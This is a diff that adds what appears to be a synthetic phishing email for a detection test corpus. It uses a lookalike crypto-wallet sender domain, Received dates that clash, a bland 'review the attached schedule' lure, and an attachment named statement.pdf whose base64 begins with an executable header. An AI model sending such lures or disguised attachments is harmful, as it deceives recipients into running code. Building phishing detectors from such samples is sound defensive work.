@@ -1,0 +1,49 @@
+From: notice@coinbase-wallet.top
+To: victim21@example.com
+Subject: Meeting notes for the west power desk [ref A8CFB85]
+Date: Tue, 05 Mar 2002 09:33:00 -0500
+Message-ID: <phish-21-9fa1400e-3268-4726-8f77-9e880874084d@coinbase-wallet.top>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 13 Mar 2002 18:03:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 19 Mar 2002 17:30:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 24 Mar 2002 20:52:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 24 Mar 2002 14:51:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 15 Mar 2002 19:55:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 03 Mar 2002 23:40:00 -0500
+Received: from relay6 (relay6.example.net [192.0.2.106]) by mx6.example.com; Tue, 02 Mar 2002 06:39:00 -0500
+Return-Path: <notice@coinbase-wallet.top>
+Reply-To: notice@coinbase-wallet.top
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=coinbase-wallet.top; dkim=pass header.d=coinbase-wallet.top; dmarc=pass header.from=coinbase-wallet.top
+Received-SPF: pass (mx.example.com: domain of notice@coinbase-wallet.top designates 192.0.2.41 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=coinbase-wallet.top; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="bnd-p-21-cfed9236"
+
+--bnd-p-21-cfed9236
+Content-Type: text/plain; charset="UTF-8"
+
+Hi,
+
+Please review the attached schedule before Friday. No action needed beyond that.
+Reference: A8CFB85
+
+Thanks,
+Colleague
+--bnd-p-21-cfed9236
+Content-Type: application/pdf; name="statement.pdf"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="statement.pdf"
+
+TVqQAMEufVUGE79eugYlx9Q1Gx74sr9XL9sqbMFfdGC9p47yIJ2I2By69w3SnxZJkwTibLH9xWUk
++Drv8Kcwn6keRWsdbpJAA5iam0LkcS6to2hm8KknxT1oFHAZ+7K9Yc78whh8o4IO6UI2+0HQBEqc
+rkZ+/UhoCWjwyrvlAdET+CkrovsD2bzvMJrIAw40mpzW0PH7SHL1zlsMCu0rtumTeRDiSqTNke6K
+7RlwagGeq9O9NuaUqOc6ioin6+ZzbD3jv9xSdSQmtFsYSWw/g8sLgM9AkKMIXR2llB0z9vP+LlXv
+Kd4gQOg3zhzoTb81+06I7FjkVQd5C46KoSflguiUgqSIebtjEMAm2ZZLQ4Q0HbXglzGP+n3iqn6X
+qIWVfN5K59tK3FlQL/HT1BKh8MguFzIFvHUsSkMkMVrmwVvPfkXXBnWqFrbD/W1j8hQpSemLk9kM
+3hRE1C230hU4koWa4pUxdUasPgCDI6g1McTLRRhkYHlpPDrfultAgCkwMyipifgCNjyiHhc0kRNl
+8AZOttkKf8lLtrk9ON5+KkrVBxqA8+0tQtiL0EyCxYayxuDiMxxNt8BNfd8Qvcgsx9x7pyIuiMrU
+x/8po8Q/6DEwFZ2ShhsYzFmXsNhkr0phUadLPwECvj+yoS0Z/gWMimDfQOBdusXdtKJffby36WqG
+bj96zFLinNi6Tccupc2l2VeuV3rrjU7eF+Jjvg2i2ONMS8obF7q9x36FiqlPJp1IO2cfxfXawhxI
+pCFjYH0kSJs3VLAC4xLoYjIKoBGBKyId9IWZ+oqkDTWu7V2g8mWCzNUf6Tzx7bmFKbWrMI+ek8Uu
+S9WQblczp05IFBc8Ow==
+
+--bnd-p-21-cfed9236--
